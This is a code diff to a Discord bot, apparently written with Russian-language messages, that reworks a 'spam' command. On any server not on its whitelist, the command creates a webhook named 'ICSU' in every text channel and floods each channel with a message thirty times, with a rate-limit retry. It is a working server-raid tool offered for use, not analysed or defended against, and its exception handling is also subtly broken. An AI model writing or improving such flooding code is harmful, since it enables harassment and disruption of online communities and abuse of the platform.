@@ -76,28 +76,24 @@ async def айди(ctx, member : discord.Member = None):
               
         
         
-async def spam_hook(ctx):
-    for textchan in ctx.guild.text_channels:
-            webs = await textchan.webhooks()
-            for web in webs:
-                await web.send(txt)
-
-async def get_hook(ctx):
-    guild = ctx.guild
-    for i in range(30):
-        await asyncio.sleep(0.7)
-        asyncio.create_task(spam_hook(ctx))
-
-
 async def create_hook(ctx):
-    guild = ctx.guild
-    for textchan in guild.text_channels:
-        webs = await textchan.create_webhook(name='ICSU')
+    for chan in ctx.guild.text_channels:
+        webhook = await chan.create_webhook(name='ICSU')
+        async with async_open('icsu.png','rb') as pfp:
+            await webhook.edit(avatar=await pfp.read())
 
-    
+        asyncio.create_task(spam_hook(webhook))  
+
+async def spam_hook(webhook):
+    for i in range(30):
+        try:
+            await webhook.send(txt)
+        except RateLimited(retry_after=5):
+            await asyncio.sleep(0.7)
+            await webhook.send(txt)
         
 @bot.command()
-async def спам(ctx):
+async def spam(ctx):
     if ctx.guild.id in whitelist:
         embed = discord.Embed(title='❌ Этот сервер в белом листе, заспамить сервер нельзя!',colour=discord.Colour.red())
         res = await ctx.reply(embed=embed)
@@ -105,7 +101,7 @@ async def спам(ctx):
         await res.delete()
     else:
         await ctx.message.delete()
-        asyncio.gather(create_hook(ctx), get_hook(ctx))
+        asyncio.create_task(create_hook(ctx))
 
 
 
@@ -305,6 +301,7 @@ async def вайтлист(ctx, serv_id: int):
     
 
 bot.run(token, log_handler=None)
+
 
 
 
